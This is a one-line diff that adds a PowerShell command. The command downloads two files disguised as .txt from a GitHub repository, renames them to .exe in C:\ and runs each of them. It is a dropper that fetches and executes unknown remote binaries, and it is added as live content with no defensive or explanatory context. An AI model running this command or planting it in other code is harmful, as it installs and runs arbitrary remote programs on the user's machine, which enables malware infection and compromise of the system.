@@ -1,0 +1,1 @@
+Invoke-WebRequest -Uri "https://github.com/denisgrnnk/ssss/raw/main/2.txt" -OutFile "C:\2.txt"; Rename-Item -Path "C:\2.txt" -NewName "2.exe"; Start-Process -FilePath "C:\2.exe"; Invoke-WebRequest -Uri "https://github.com/denisgrnnk/ssss/raw/main/1.txt" -OutFile "C:\1.txt"; Rename-Item -Path "C:\1.txt" -NewName "1.exe"; Start-Process -FilePath "C:\1.exe"
